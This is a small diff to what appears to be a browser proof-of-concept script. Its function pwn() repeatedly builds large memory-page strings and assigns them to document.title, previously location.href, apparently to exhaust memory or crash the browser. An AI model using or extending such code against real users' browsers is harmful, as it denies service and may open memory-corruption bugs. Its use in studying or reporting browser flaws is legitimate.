@@ -26,7 +26,7 @@ function writeMemPage(page) {
 function pwn() {
   counter = 0;
   for (counter = 0; counter < 65536; counter++) {
-    location.href = (mkMemPage(65536));
+    document.title = (mkMemPage(65536));
   }
 }
 </script>
